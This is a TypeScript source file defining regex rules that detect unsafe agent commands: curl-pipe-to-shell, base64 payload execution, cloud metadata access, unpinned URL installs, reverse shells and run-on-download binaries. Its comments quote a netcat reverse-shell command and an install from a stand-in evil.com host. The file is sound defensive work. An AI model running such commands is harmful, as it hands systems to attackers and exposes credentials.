// Ported 1:1 from src/agentaudit/rules/unsafe.py (Python implementation is the spec).
// Patterns use String.raw so they stay character-for-character identical to the
// Python raw strings; adjacent String.raw`` segments concatenate exactly like
// the adjacent string literals in the .py file.
import { NetworkRequest, ShellCommand, type Severity } from "../events.js";
import { RegexRule, type Rule } from "./base.js";

export class U001 extends RegexRule {
  // middle spans capped {0,400}: adversarial repeated anchors stay linear (ReDoS hardening)
  // \b prefix (v0.1.1): `xcurl ... | sh` must not match
  static override pattern =
    String.raw`\b(curl|wget|iwr|Invoke-WebRequest)\b[^|;&\n]{0,400}\|` +
    String.raw`\s*(sudo\s+)?(iex|Invoke-Expression|(ba|z|da)?sh)\b`;
  id = "U001";
  severity: Severity = "critical";
  title = "Pipe remote content into shell";
  explanation = "Downloads executed without inspection run arbitrary attacker-controlled code.";
  recommendation = "Download, review, then run; remove any persistence the script added.";
}

export class U002 extends RegexRule {
  // middle spans capped {0,400}: adversarial repeated anchors stay linear (ReDoS hardening)
  static override pattern =
    String.raw`base64\s+(-d|--decode)\b[^|;&\n]{0,400}\|[^|;&\n]{0,400}sh\b` +
    String.raw`|FromBase64String` +
    String.raw`|echo\s+[A-Za-z0-9+/=]{60,}\s*\|\s*(ba)?sh\b`;
  id = "U002";
  severity: Severity = "high";
  title = "Execute obfuscated payload";
  explanation = "Base64-decoded execution hides the real payload from review.";
  recommendation = "Decode the payload and inspect it before trusting the session.";
}

export class U003 extends RegexRule {
  // NOTE: `(?![\w.])` after each host (DEVIATION from the plan's bare literals):
  // the plan's pattern matched the IP inside `169.254.169.254.evil.com`, failing
  // its own planned miss case (subdomain squatting). The lookahead rejects the
  // host only when more hostname (word chars or dots) follows; the real
  // endpoints are followed by `/`, `:`, whitespace or end (e.g.
  // `169.254.169.254/latest/meta-data/` still matches).
  static override pattern =
    String.raw`169\.254\.169\.254(?![\w.])|169\.254\.170\.2(?![\w.])` +
    String.raw`|metadata\.google\.internal(?![\w.])|metadata\.azure\.com(?![\w.])`;
  id = "U003";
  severity: Severity = "critical";
  title = "Cloud metadata endpoint access";
  explanation = "Instance metadata endpoints return cloud credentials (SSRF to IAM takeover).";
  recommendation = "Rotate cloud credentials for the instance immediately.";
  appliesTo = [ShellCommand, NetworkRequest];
}

export class U004 extends RegexRule {
  // middle spans capped {0,400}: adversarial repeated anchors stay linear (ReDoS hardening)
  // NOTE: npm branch accepts ANY `https?://`/`git+` (DEVIATION from the plan's
  // `git\+?https?://|https?://\S+\.git\b`): the plan's pattern required a `.git`
  // suffix and missed its own planned hit case `npm install -g https://evil.com/pkg.tgz`.
  // Mirrors the pip branch in the same pattern (any URL = unpinned install).
  static override pattern =
    String.raw`(npm|pnpm|yarn)\s+(i|install)\b[^|;&\n]{0,400}(https?://|git\+)` +
    String.raw`|pip3?\s+install\b[^|;&\n]{0,400}(https?://|git\+)`;
  id = "U004";
  severity: Severity = "low";
  title = "Install from unpinned URL";
  explanation = "Global installs from raw URLs bypass package registries and integrity checks.";
  recommendation = "Prefer registry installs with pinned versions.";
}

export class U005 extends RegexRule {
  // middle spans capped {0,400}: adversarial repeated anchors stay linear (ReDoS hardening)
  // NOTE: `/?(bin/|usr/bin/)?` before `(ba)?sh` (DEVIATION from the plan's
  // `/?(ba)?sh`): the plan's pattern required `sh` right after the optional
  // slash and missed its own planned hit case `nc -e /bin/sh 10.0.0.1 4444`
  // (the canonical GTFOBins form, where `bin/` sits between `/` and `sh`).
  // Explicit path segments (not `\S*`) keep backtracking bounded.
  static override pattern =
    String.raw`\bnc\b[^|;&\n]{0,400}\s-e\s+/?(bin/|usr/bin/)?(ba)?sh\b` +
    String.raw`|/dev/tcp/` +
    String.raw`|\bsocat\b[^|;&\n]{0,400}exec`;
  id = "U005";
  severity: Severity = "critical";
  title = "Reverse-shell pattern";
  explanation = "Reverse shells hand an interactive machine shell to a remote party.";
  recommendation = "Kill the connection; investigate the machine for further compromise.";
}

export class U006 extends RegexRule {
  static override pattern = String.raw`chmod\s+\+x\s+\S+\s*(&&|;)\s*\./`;
  id = "U006";
  severity: Severity = "medium";
  title = "Downloaded binary executed";
  explanation = "A file was made executable and immediately run in one command.";
  recommendation = "Verify the binary's origin and hash before further use.";
}

export function rules(): Rule[] {
  return [new U001(), new U002(), new U003(), new U004(), new U005(), new U006()];
}
